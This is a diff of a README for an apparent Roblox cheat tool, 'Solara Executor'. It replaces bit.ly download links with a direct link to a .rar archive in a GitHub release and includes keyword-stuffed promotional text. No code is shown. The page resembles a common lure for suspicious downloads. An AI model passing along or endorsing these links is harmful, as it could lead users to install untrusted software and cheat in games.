@@ -1,5 +1,5 @@
 ![sss](https://github.com/user-attachments/assets/fe003442-7413-4445-84e4-38449e4f60d3)
-# <p align="center">[Download](https://bit.ly/3MEnOai)</p>
+# <p align="center">[Download](https://github.com/lyx219/Roblox-Solara-Executor/releases/download/download/SolaraExecutor.rar)</p>
 
 # <p align="center">Description</p>
 
@@ -14,7 +14,7 @@ Roblox executor, script executor, Roblox hacks, Roblox mods, gaming tools, scrip
 # Installation
 To install Solara Executor, follow these simple steps:
 
-  1. **[Download](https://bit.ly/3MEnOai) the Solara Executor** package **[Download Solara Executor](https://bit.ly/3MEnOai)**
+  1. **[Download](https://github.com/lyx219/Roblox-Solara-Executor/releases/download/download/SolaraExecutor.rar) the Solara Executor** package **[Download Solara Executor](https://github.com/lyx219/Roblox-Solara-Executor/releases/download/download/SolaraExecutor.rar)**
   2. **Extract the downloaded ZIP file** to your desired location on your system.
 
 
